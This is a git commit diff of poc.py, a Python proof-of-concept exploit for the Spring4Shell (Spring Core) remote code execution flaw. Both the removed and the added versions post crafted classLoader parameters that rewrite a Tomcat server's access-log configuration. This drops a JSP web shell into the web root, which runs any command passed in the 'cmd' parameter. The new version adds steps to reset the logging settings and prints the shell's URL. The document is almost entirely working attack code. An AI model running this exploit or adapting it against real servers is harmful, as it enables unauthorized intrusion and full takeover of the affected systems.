3ff98c1e694211b321ffb38d9bd277db3d335c8c
sechelper <100655242+sechelper@users.noreply.github.com>
2022-04-03 19:24:18 +0800

    Update poc.py
    v2.0

--- poc.py
+++ poc.py
@@ -1,56 +1,99 @@
-# coding:utf-8
-# 
+# Author: @Rezn0k
+# Based off the work of p1n93r
+# ref: https://github.com/lunasec-io/Spring4Shell-POC/blob/master/exploit.py
 
 import requests
 import argparse
-from urllib.parse import urljoin
+from urllib.parse import urlparse
+import time
+
+# Set to bypass errors if the target site has SSL issues
+requests.packages.urllib3.disable_warnings()
+
+post_headers = {
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+
+get_headers = {
+    "prefix": "<%",
+    "suffix": "%>//",
+    # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
+    "c": "Runtime",
+}
 
 
-def Exploit(url):
-    headers = {
-        "suffix": "%>//",
-        "c1": "Runtime",
-        "c2": "<%",
-        "DNT": "1",
-        "Content-Type": "application/x-www-form-urlencoded",
-    }
-    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
-    try:
+def run_exploit(url, directory, filename):
+    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
+                  f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
+                  f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
+                  f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
 
-        go = requests.post(
-            url,
-            headers=headers,
-            data=data,
-            timeout=15,
-            allow_redirects=False,
-            verify=False,
-        )
-        shellurl = urljoin(url, "tomcatwar.jsp")
-        shellgo = requests.get(
-            shellurl, timeout=15, allow_redirects=False, verify=False
-        )
-        if shellgo.status_code == 200:
-            print(
-                f"The vulnerability exists, shell address is: {shellurl}?pwd=j&cmd=whoami"
-            )
-    except Exception as e:
-        print(e)
-        pass
+    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
+    log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}"
+    log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
+    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+
+    exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])
+
+    # Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times
+    # If re-running the exploit, this will create an artifact of {old_file_name}_.jsp
+    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
+    print("[*] Resetting Log Variables.")
+    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False)
+    print("[*] Response code: %d" % ret.status_code)
+
+    # Change the tomcat log location variables
+    print("[*] Modifying Log Configurations")
+    ret = requests.post(url, headers=post_headers, data=exp_data, verify=False)
+    print("[*] Response code: %d" % ret.status_code)
+
+    # Changes take some time to populate on tomcat
+    time.sleep(3)
+
+    # Send the packet that writes the web shell
+    ret = requests.get(url, headers=get_headers, verify=False)
+    print("[*] Response Code: %d" % ret.status_code)
+
+    time.sleep(1)
+
+    # Reset the pattern to prevent future writes into the file
+    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
+    print("[*] Resetting Log Variables.")
+    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False)
+    print("[*] Response code: %d" % ret.status_code)
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Srping-Core Rce.")
-    parser.add_argument("--file", help="url file", required=False)
-    parser.add_argument("--url", help="target url", required=False)
-    args = parser.parse_args()
-    if args.url:
-        Exploit(args.url)
-    if args.file:
-        with open(args.file) as f:
-            for i in f.readlines():
-                i = i.strip()
-                Exploit(i)
+    parser = argparse.ArgumentParser(description='Spring Core RCE')
+    parser.add_argument('--url', help='target url', required=True)
+    parser.add_argument('--file', help='File to write to [no extension]', required=False, default="shell")
+    parser.add_argument('--dir', help='Directory to write to. Suggest using "webapps/[appname]" of target app',
+                        required=False, default="webapps/ROOT")
+
+    file_arg = parser.parse_args().file
+    dir_arg = parser.parse_args().dir
+    url_arg = parser.parse_args().url
+
+    filename = file_arg.replace(".jsp", "")
+
+    if url_arg is None:
+        print("Must pass an option for --url")
+        return
+
+    try:
+        run_exploit(url_arg, dir_arg, filename)
+        print("[+] Exploit completed")
+        print("[+] Check your target for a shell")
+        print("[+] File: " + filename + ".jsp")
+
+        if dir_arg:
+            location = urlparse(url_arg).scheme + "://" + urlparse(url_arg).netloc + "/" + filename + ".jsp"
+        else:
+            location = f"Unknown. Custom directory used. (try app/{filename}.jsp?cmd=whoami"
+        print(f"[+] Shell should be at: {location}?cmd=id")
+    except Exception as e:
+        print(e)
 
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
